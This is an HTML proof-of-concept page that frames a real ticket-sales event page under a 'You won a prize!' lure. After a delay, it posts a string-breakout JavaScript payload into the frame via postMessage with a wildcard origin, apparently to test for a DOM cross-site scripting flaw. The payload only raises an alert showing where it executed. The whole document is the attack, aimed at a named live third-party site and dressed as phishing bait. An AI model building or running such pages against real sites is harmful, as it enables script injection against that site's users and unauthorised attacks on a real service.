<!DOCTYPE html>
<html>
<body>
    <h1>You won a prize!</h1>
    <iframe id="targetApp" src="https://www.district.in/events/ye-live-in-india-2026-buy-tickets"></iframe>
    
    <script>
        // Wait for the iframe to load, then fire the payload
        setTimeout(function() {
          var targetFrame = document.getElementById('targetApp').contentWindow;
            
            // Hardcoded diagnostic payload. If this pops, it will literally tell you where it executed.
            var payload = "'-alert(\"Execution Context: \" + window.origin)-'";
            
            console.log("Sending payload to iframe...");
            targetFrame.postMessage(payload, '*');
        }, 25000);
    </script>
</body>
</html>
